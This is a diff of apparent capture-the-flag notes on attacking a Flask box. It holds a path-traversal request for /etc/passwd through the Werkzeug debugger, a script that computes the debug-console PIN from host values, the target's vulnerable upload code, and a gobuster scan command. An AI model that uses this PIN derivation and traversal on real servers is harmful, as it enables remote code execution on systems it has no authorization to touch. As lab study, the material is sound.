@@ -7,6 +7,9 @@
 
 ## <span style="color:[COLOR]">Checklist 🤓   
 
+- [ ] It might be SSTI
+- [ ] There could be a way to upload a file onto the web server ( a php file ) and executing it by visiting it.
+- [ ] The `/console` directory.
 
 
 <br/><br/>
@@ -41,15 +44,15 @@ GET /upcloud?__debugger__=yes&cmd=resource&f=../../../../../../../../etc/passwd
 import hashlib
 from itertools import chain
 probably_public_bits = [
-    'web3_user',# username
+    'flask',# username
     'flask.app',# modname
     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
-    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None), //// cc289382c632
 ]
 
 private_bits = [
-    '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
-    'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
+    '2485377892360', #2485377892360# bstr(uuid.getnode()),  /sys/class/net/ens33/address ///02:42:AC:11:00:08 
+    'cc289382c632'# get_machine_id(), /etc/machine-id  /// cc289382c632
 ]
 
 h = hashlib.md5()
@@ -81,7 +84,52 @@ if rv is None:
 
 print(rv)
 ```  
-* I need to generate the PIN but I don't have the username of the user who created the flask process and I also need other info that I should get through some kind of a directory traversal.
+* I need to generate the PIN but I don't have the username of the user who created the flask process and I also need other info that I should get through some kind of a directory traversal.  
+
+```python
+
+def get_file_name(unsafe_filename):
+    return recursive_replace(unsafe_filename, "../", "")
+
+
+def recursive_replace(search, replace_me, with_me):
+    if replace_me not in search:
+        return search
+    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
+ 
+```   
+
+```python
+import os
+
+from app.utils import get_file_name
+from flask import render_template, request, send_file
+
+from app import app
+
+
+@app.route('/', methods=['GET', 'POST'])
+def upload_file():
+    if request.method == 'POST':
+        f = request.files['file']
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
+        f.save(file_path)
+        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
+    return render_template('upload.html')
+
+
+@app.route('/uploads/<path:path>')
+def send_report(path):
+    path = get_file_name(path)
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))  
+```
+
+
+
+gobuster dir -u 10.10.11.164 -x 'txt,md,jpg,php,html' -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '404,403'
+
+
 
 <br/><br/>
 
